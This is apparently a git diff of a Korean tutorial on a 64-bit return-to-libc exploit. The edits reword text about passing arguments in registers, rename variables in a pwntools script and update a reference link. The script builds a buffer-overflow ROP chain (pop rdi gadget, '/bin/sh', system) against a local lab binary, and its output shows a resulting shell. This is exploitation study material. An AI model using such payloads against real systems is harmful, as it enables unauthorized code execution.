@@ -78,11 +78,9 @@ $3 = {int (const char *)} 0x7ffff7c58750 <__libc_system>
 
 ASLR이 해제되어 있어 확보한 주소들은 변하지 않는다. 
 
-이제 쉘을 실행하기 위한 정보는 다 얻었으니, 리턴 주소를 변조해보자.
+이제 쉘을 실행하기 위한 정보는 다 얻었으니, 리턴 주소를 변조해보자. 64bit는 함수 호출 시 레지스터를 이용해 인자를 전달한다. 
 
-64bit는 함수 호출 시 레지스터를 이용해 인자를 전달한다. 
-
-> 32bit는 스택을 이용했다.
+> 32bit는 스택을 이용해 인자를 전달했다.
 
 |인자 순서 | 	레지스터|	역할|
 |:-:|:-:|:-:|
@@ -118,12 +116,12 @@ from pwn import *
 
 p = process('./vuln')
 
-poprdi = p64(0x7ffff7d0f75b)
-binsh = p64(0x7ffff7dcb42f)
+pop_rdi = p64(0x7ffff7d0f75b)
+bin_sh = p64(0x7ffff7dcb42f)
 system = p64(0x7ffff7c58750)
 ret = p64(0x0000000000401190)
 
-payload = b'A'*64 + b'B'*8 + ret +  poprdi + binsh + system
+payload = b'A'*64 + b'B'*8 + ret + pop_rdi + bin_sh + system
 p.sendline(payload)
 
 p.interactive()
@@ -151,4 +149,4 @@ uid=1000(..) gid=1000(..) groups=1000(..),4(adm),24(cdrom),27(sudo),30(dip),46(p
 
 ## References
 
-- [01.RTL(Return to Libc) - x86](https://www.lazenca.net/display/TEC/01.RTL%28Return+to+Libc%29+-+x86)
+- [02.RTL(Return to Libc) - x64](https://www.lazenca.net/display/TEC/02.RTL%28Return+to+Libc%29+-+x64)
